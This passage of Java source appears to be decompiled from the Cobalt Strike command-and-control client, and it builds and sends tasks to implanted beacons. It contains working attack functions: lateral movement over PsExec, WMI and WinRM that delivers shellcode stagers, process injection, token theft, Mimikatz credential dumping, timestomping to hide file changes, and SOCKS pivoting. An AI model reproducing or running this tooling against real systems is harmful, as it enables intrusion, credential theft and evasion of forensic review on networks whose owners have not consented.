        byte[] task = this.builder.build();
        this.log_task(bid, "Tasked beacon to run " + Listener.getListener(listener).toString(target) + " on " + target + " via Service Control Manager (PSH)", "T1035, T1050");
        this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.ServiceIndicator(bid, target, sname)));
        this.conn.call("beacons.task", CommonUtils.args(bid, task));
        this.handlePipeStager(target, listener);
    }

    public void PsExecCommand(String target, String sname, String command) {
        for (String bid : this.bids) {
            this.PsExecCommand(bid, target, sname, command);
        }
    }

    public void PsExecCommand(String bid, String target, String sname, String command) {
        this.builder.setCommand(58);
        this.builder.addLengthAndEncodedString(bid, target);
        this.builder.addLengthAndEncodedString(bid, sname);
        this.builder.addLengthAndEncodedString(bid, command);
        byte[] task = this.builder.build();
        this.log_task(bid, "Tasked beacon to run '" + command + "' on " + target + " via Service Control Manager", "T1035, T1050");
        this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.ServiceIndicator(bid, target, sname)));
        this.conn.call("beacons.task", CommonUtils.args(bid, task));
    }

    public void PsInject(int pid, String arch, String command) {
        for (String bid : this.bids) {
            String cradle = new PowerShellTasks(this.client, bid).getImportCradle();
            new PowerShellJob(this, cradle, command).inject(bid, pid, arch);
        }
    }

    public void Pwd() {
        this.taskNoArgs(39, "Tasked beacon to print working directory");
    }

    public void RegQuery(Registry reg) {
        for (String bid : this.bids) {
            this.RegQuery(bid, reg);
        }
    }

    public void RegQuery(String bid, Registry reg) {
        BeaconEntry entry = DataUtils.getBeacon(this.data, bid);
        this.builder.setCommand(81);
        this.builder.addShort(reg.getFlags(entry));
        this.builder.addShort(reg.getHive());
        this.builder.addLengthAndEncodedString(bid, reg.getPath());
        this.builder.addLengthAndEncodedString(bid, "");
        byte[] task = this.builder.build();
        this.log_task(bid, "Tasked beacon to query " + reg.toString(), "T1012");
        this.conn.call("beacons.task", CommonUtils.args(bid, task));
    }

    public void RegQueryValue(Registry reg) {
        for (String bid : this.bids) {
            this.RegQueryValue(bid, reg);
        }
    }

    public void RegQueryValue(String bid, Registry reg) {
        BeaconEntry entry = DataUtils.getBeacon(this.data, bid);
        this.builder.setCommand(81);
        this.builder.addShort(reg.getFlags(entry));
        this.builder.addShort(reg.getHive());
        this.builder.addLengthAndEncodedString(bid, reg.getPath());
        this.builder.addLengthAndEncodedString(bid, reg.getValue());
        byte[] task = this.builder.build();
        this.log_task(bid, "Tasked beacon to query " + reg.toString(), "T1012");
        this.conn.call("beacons.task", CommonUtils.args(bid, task));
    }

    public void Rev2Self() {
        this.taskNoArgs(28, "Tasked beacon to revert token", "T1134");
    }

    public void Rm(String folder) {
        for (String bid : this.bids) {
            this.Rm(bid, folder);
        }
    }

    public void Rm(String bid, String folder) {
        byte[] encoded = DataUtils.encodeForBeacon(this.client.getData(), bid, folder);
        if (encoded.length == 0) {
            this.error(bid, "Rejected empty argument for rm. Use . to remove current folder");
            return;
        }
        String decoded = DataUtils.decodeForBeacon(this.client.getData(), bid, encoded);
        if (!decoded.equals(folder)) {
            this.error(bid, "'" + folder + "' did not decode in a sane way. Specify '" + decoded + "' explicity.");
            return;
        }
        this.builder.setCommand(56);
        this.builder.addString(encoded);
        byte[] task = this.builder.build();
        this.log_task(bid, "Tasked beacon to remove " + folder, "T1107, " + this.file_to_tactic(folder));
        this.conn.call("beacons.task", CommonUtils.args(bid, task));
    }

    public void Run(String command) {
        for (String bid : this.bids) {
            this.builder.setCommand(78);
            this.builder.addLengthAndString("");
            this.builder.addLengthAndEncodedString(bid, command);
            this.builder.addShort(0);
            byte[] task = this.builder.build();
            this.log_task(bid, "Tasked beacon to run: " + command, "T1059");
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    public void RunAs(String domain, String user, String pass, String cmd) {
        for (String bid : this.bids) {
            this.builder.setCommand(38);
            this.builder.addLengthAndEncodedString(bid, domain);
            this.builder.addLengthAndEncodedString(bid, user);
            this.builder.addLengthAndEncodedString(bid, pass);
            this.builder.addLengthAndEncodedString(bid, cmd);
            byte[] task = this.builder.build();
            this.log_task(bid, "Tasked beacon to execute: " + cmd + " as " + domain + "\\" + user, "T1078, T1106");
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    public void RunUnder(int ppid, String cmd) {
        for (String bid : this.bids) {
            this.builder.setCommand(76);
            this.builder.addInteger(ppid);
            this.builder.addLengthAndEncodedString(bid, cmd);
            byte[] runtask = this.builder.build();
            this.log_task(bid, "Tasked beacon to execute: " + cmd + " as a child of " + ppid, "T1106");
            this.conn.call("beacons.task", CommonUtils.args(bid, runtask));
        }
    }

    public void Screenshot(int pid, String arch, int time) {
        new ScreenshotJob(this, time).inject(pid, arch);
    }

    public void Screenshot(int time) {
        for (String bid : this.bids) {
            BeaconEntry entry = DataUtils.getBeacon(this.data, bid);
            if (entry == null) continue;
            new ScreenshotJob(this, time).spawn(bid, entry.arch());
        }
    }

    public void Shell(String command) {
        for (String bid : this.bids) {
            this.Shell(bid, CommonUtils.session(bid), command);
        }
    }

    public void Shell(String bid, String stype, String command) {
        switch (stype) {
            case "session":
                this.builder.setCommand(2);
                this.builder.addEncodedString(bid, command);
                break;
            case "beacon":
                this.builder.setCommand(78);
                this.builder.addLengthAndString("%COMSPEC%");
                this.builder.addLengthAndEncodedString(bid, " /C " + command);
                this.builder.addShort(0);
                break;
            default:
                CommonUtils.print_error("Unknown session type '" + stype + "' for " + bid + ". Didn't run '" + command + "'");
                return;
        }
        byte[] task = this.builder.build();
        this.log_task(bid, "Tasked " + stype + " to run: " + command, "T1059");
        this.conn.call("beacons.task", CommonUtils.args(bid, task));
    }

    public void ShellSudo(String password, String command) {
        this.taskOneArg(2, "echo \"" + password + "\" | sudo -S " + command, "Tasked session to run: " + command + " (sudo)", "T1169");
    }

    public void Sleep(int time, int jitter) {
        this.builder.setCommand(4);
        if (time == 0) {
            this.builder.addInteger(100);
            this.builder.addInteger(90);
        } else {
            this.builder.addInteger(time * 1000);
            this.builder.addInteger(jitter);
        }
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            BeaconEntry entry = DataUtils.getEgressBeacon(this.data, bid);
            BeaconEntry mine = DataUtils.getBeacon(this.data, bid);
            if (entry != null && mine != null && !entry.getId().equals(bid)) {
                if (time == 0) {
                    this.log_task(bid, "Tasked " + CommonUtils.session(bid) + " to become interactive [change made to: " + entry.title() + "]");
                    this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Input(entry.getId(), "sleep 0 [from: " + mine.title() + "]")));
                    this.log_task(entry.getId(), "Tasked beacon to become interactive", "T1029");
                } else if (jitter == 0) {
                    this.log_task(bid, "Tasked " + CommonUtils.session(bid) + " to sleep for " + time + "s [change made to: " + entry.title() + "]");
                    this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Input(entry.getId(), "sleep " + time + "s [from: " + mine.title() + "]")));
                    this.log_task(entry.getId(), "Tasked beacon to sleep for " + time + "s", "T1029");
                } else {
                    this.log_task(bid, "Tasked " + CommonUtils.session(bid) + " to sleep for " + time + "s (" + jitter + "% jitter) [change made to: " + entry.title() + "]");
                    this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Input(entry.getId(), "sleep " + time + " " + jitter + " [from: " + mine.title() + "]")));
                    this.log_task(entry.getId(), "Tasked beacon to sleep for " + time + "s (" + jitter + "% jitter)", "T1029");
                }
                this.conn.call("beacons.task", CommonUtils.args(entry.getId(), task));
                continue;
            }
            if (time == 0) {
                this.log_task(bid, "Tasked beacon to become interactive", "T1029");
            } else if (jitter == 0) {
                this.log_task(bid, "Tasked beacon to sleep for " + time + "s", "T1029");
            } else {
                this.log_task(bid, "Tasked beacon to sleep for " + time + "s (" + jitter + "% jitter)", "T1029");
            }
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    public void GoInteractive(String bid) {
        BeaconEntry entry = DataUtils.getEgressBeacon(this.data, bid);
        this.builder.setCommand(4);
        this.builder.addInteger(100);
        this.builder.addInteger(90);
        byte[] task = this.builder.build();
        if (entry != null) {
            this.conn.call("beacons.task", CommonUtils.args(entry.getId(), task));
        }
    }

    public void SetEnv(String key, String value) {
        StringBuilder command = new StringBuilder();
        command.append(key);
        command.append("=");
        if (value != null && value.length() > 0) {
            command.append(value);
            command.append('\u0000');
            this.taskOneEncodedArg(72, command.toString(), "Tasked beacon to set " + key + " to " + value, "");
        } else {
            command.append('\u0000');
            this.taskOneEncodedArg(72, command.toString(), "Tasked beacon to unset " + key, "");
        }
    }

    public void SocksStart(int port) {
        for (String bid : this.bids) {
            this.GoInteractive(bid);
            this.conn.call("beacons.pivot", CommonUtils.args(bid, port));
        }
    }

    public void SocksStop() {
        for (String bid : this.bids) {
            this.conn.call("beacons.pivot_stop", CommonUtils.args(bid));
        }
    }

    public void Spawn(String listener) {
        this.Spawn(listener, "x86");
    }

    public void Spawn(String listener, String arch) {
        byte[] stager = new byte[]{};
        int command = 0;
        if ("x86".equals(arch)) {
            stager = DataUtils.shellcode(this.gdata, listener);
            command = 1;
        } else if ("x64".equals(arch)) {
            stager = DataUtils.shellcodeX64(this.gdata, listener);
            command = 44;
        }
        if (stager.length == 0) {
            this.error("No " + arch + " stager for " + Listener.getListener(listener));
            return;
        }
        this.taskOneArg(command, CommonUtils.bString(stager), "Tasked beacon to spawn (" + arch + ") " + Listener.getListener(listener), "T1093");
        this.handleBindStager(listener, arch);
    }

    public void SpawnAs(String domain, String user, String pass, String listener) {
        byte[] stager = DataUtils.shellcode(this.gdata, listener);
        byte[] script = new ResourceUtils(this.client).buildPowerShell(stager);
        int port = CommonUtils.randomPort();
        String runme = new PowerShellUtils(this.client).format(new PowerShellUtils(this.client).PowerShellDownloadCradle("http://127.0.0.1:" + port + "/"), false);
        this.builder.setCommand(59);
        this.builder.addShort(port);
        this.builder.addString(script);
        byte[] setuptask = this.builder.build();
        for (String bid : this.bids) {
            this.builder.setCommand(38);
            this.builder.addLengthAndEncodedString(bid, domain);
            this.builder.addLengthAndEncodedString(bid, user);
            this.builder.addLengthAndEncodedString(bid, pass);
            this.builder.addLengthAndEncodedString(bid, runme);
            byte[] runtask = this.builder.build();
            this.log_task(bid, "Tasked beacon to spawn " + Listener.getListener(listener) + " as " + domain + "\\" + user, "T1078, T1086");
            this.conn.call("beacons.task", CommonUtils.args(bid, setuptask));
            this.conn.call("beacons.task", CommonUtils.args(bid, runtask));
        }
        this.handleBindStager(listener);
    }

    public void SpawnTo() {
        this.taskNoArgs(13, "Tasked beacon to spawn features to default process", "T1093");
    }

    public void SpawnTo(String arch, String path) {
        if ("x86".equals(arch)) {
            this.taskOneEncodedArg(13, path, "Tasked beacon to spawn " + arch + " features to: " + path, "T1093");
        } else {
            this.taskOneEncodedArg(69, path, "Tasked beacon to spawn " + arch + " features to: " + path, "T1093");
        }
    }

    public void SpawnUnder(int ppid, String listener) {
        byte[] stager = DataUtils.shellcode(this.gdata, listener);
        byte[] script = new ResourceUtils(this.client).buildPowerShell(stager);
        int port = CommonUtils.randomPort();
        String runme = new PowerShellUtils(this.client).format(new PowerShellUtils(this.client).PowerShellDownloadCradle("http://127.0.0.1:" + port + "/"), false);
        this.builder.setCommand(59);
        this.builder.addShort(port);
        this.builder.addString(script);
        byte[] setuptask = this.builder.build();
        this.builder.setCommand(76);
        this.builder.addInteger(ppid);
        this.builder.addLengthAndString(runme);
        byte[] runtask = this.builder.build();
        for (String bid : this.bids) {
            this.log_task(bid, "Tasked beacon to spawn " + Listener.getListener(listener) + " as a child of " + ppid, "T1106, T1086");
            this.conn.call("beacons.task", CommonUtils.args(bid, setuptask));
            this.conn.call("beacons.task", CommonUtils.args(bid, runtask));
        }
        this.handleBindStager(listener);
    }

    public void StealToken(int pid) {
        this.taskOneArgI(31, pid, "Tasked beacon to steal token from PID " + pid, "T1134");
    }

    public void ShellcodeInject(int pid, String arch, String file) {
        byte[] mycode = CommonUtils.readFile(file);
        if ("x64".equals(arch)) {
            this.builder.setCommand(43);
        } else {
            this.builder.setCommand(9);
        }
        this.builder.addInteger(pid);
        this.builder.addInteger(0);
        this.builder.addString(CommonUtils.bString(mycode));
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            this.log_task(bid, "Tasked beacon to inject " + file + " into " + pid, "T1055");
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    public void ShellcodeSpawn(String arch, String file) {
        byte[] mycode = CommonUtils.readFile(file);
        if ("x64".equals(arch)) {
            this.builder.setCommand(44);
        } else {
            this.builder.setCommand(1);
        }
        this.builder.addString(CommonUtils.bString(mycode));
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            this.log_task(bid, "Tasked beacon to spawn " + file + " in " + arch + " process", "T1093");
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    public void TimeStomp(String dest, String src) {
        for (String bid : this.bids) {
            this.TimeStomp(bid, dest, src);
        }
    }

    public void TimeStomp(String bid, String dest, String src) {
        this.builder.setCommand(29);
        this.builder.addLengthAndEncodedString(bid, src);
        this.builder.addLengthAndEncodedString(bid, dest);
        byte[] task = this.builder.build();
        this.log_task(bid, "Tasked beacon to timestomp " + dest + " to " + src, "T1099");
        this.conn.call("beacons.task", CommonUtils.args(bid, task));
    }

    public void Unlink(String host) {
        for (String bid : this.bids) {
            this.log_task(bid, "Tasked to unlink " + host, "T1090");
            this.conn.call("beacons.unlink", CommonUtils.args(bid, host));
        }
    }

    public void Upload(String src) {
        String dst = new File(src).getName();
        this.Upload(src, dst);
    }

    public void Upload(String src, String dst) {
        try {
            FileInputStream fin = new FileInputStream(src);
            byte[] data = CommonUtils.readAll(fin);
            fin.close();
            this.UploadRaw(src, dst, data);
        } catch (Exception ex) {
            MudgeSanity.logException("Upload: " + src + " -> " + dst, ex, false);
        }
    }

    public void UploadRaw(String src, String dst, byte[] data) {
        for (String bid : this.bids) {
            this.UploadRaw(bid, src, dst, data);
        }
    }

    public void UploadRaw(String bid, String src, String dst, byte[] data) {
        ByteIterator chunks = new ByteIterator(data);
        LinkedList<byte[]> tasks = new LinkedList<>();
        this.builder.setCommand(10);
        this.builder.addLengthAndEncodedString(bid, dst);
        this.builder.addString(CommonUtils.bString(chunks.next(786432L)));
        tasks.add(this.builder.build());
        while (chunks.hasNext()) {
            this.builder.setCommand(67);
            this.builder.addLengthAndEncodedString(bid, dst);
            this.builder.addString(CommonUtils.bString(chunks.next(260096L)));
            tasks.add(this.builder.build());
        }
        this.log_task(bid, "Tasked beacon to upload " + src + " as " + dst);
        for (Object task : tasks) {
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
        this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.FileIndicator(bid, dst, data)));
    }

    public void WDigest() {
        this.MimikatzSmall("sekurlsa::wdigest");
    }

    public void WinRM(String target, String listener) {
        for (String bid : this.bids) {
            this.WinRM(bid, target, listener);
        }
    }

    public void WinRM(String bid, String target, String listener) {
        PowerShellTasks ptasks = new PowerShellTasks(this.client, bid);
        byte[] stager = DataUtils.shellcode(this.gdata, listener, true);
        String script = CommonUtils.bString(new ResourceUtils(this.client).buildPowerShell(stager));
        script = "Invoke-Command -ComputerName " + target + " -ScriptBlock { " + script + " }";
        this.log_task(bid, "Tasked beacon to run " + Listener.getListener(listener).toString(target) + " on " + target + " via WinRM", "T1028, T1086");
        String cradle = ptasks.getScriptCradle(script);
        ptasks.runCommand(cradle);
        this.handlePipeStager(target, listener);
    }

    public void WMI(String target, String listener) {
        for (String bid : this.bids) {
            this.WMI(bid, target, listener);
        }
    }

    public void WMI(String bid, String target, String listener) {
        PowerShellTasks ptasks = new PowerShellTasks(this.client, bid);
        byte[] stager = DataUtils.shellcode(this.gdata, listener, true);
        String script = CommonUtils.bString(new PowerShellUtils(this.client).buildPowerShellCommand(stager));
        script = "Invoke-WMIMethod win32_process -name create -argumentlist '" + script + "' -ComputerName " + target;
        this.log_task(bid, "Tasked beacon to run " + Listener.getListener(listener).toString(target) + " on " + target + " via WMI", "T1047, T1086");
        String cradle = ptasks.getScriptCradle(script);
        ptasks.runCommand(cradle);
        this.handlePipeStager(target, listener);
    }

    public void handleBindStager(String name) {
        this.handleBindStager(name, "x86");
    }

    public void handleBindStager(String name, String arch) {
        Listener moo = Listener.getListener(name);
        if (!moo.isStager("bind_pipe")) {
            return;
        }
        this.builder.setCommand(21);
        this.builder.addString(".");
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            this.conn.call("beacons.stage_smb", CommonUtils.args(bid, name, moo.getPort(), arch, moo.getConfig().getBindGarbageLength()));
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    public void handlePipeStager(String host, String name) {
        Listener moo = Listener.getListener(name);
        if (!moo.isStager("bind_pipe")) {
            return;
        }
        this.builder.setCommand(21);
        this.builder.addString(host);
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            this.conn.call("beacons.stage_over_smb", CommonUtils.args(bid, "\\\\" + host + "\\pipe\\" + moo.getPipe()));
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }
}

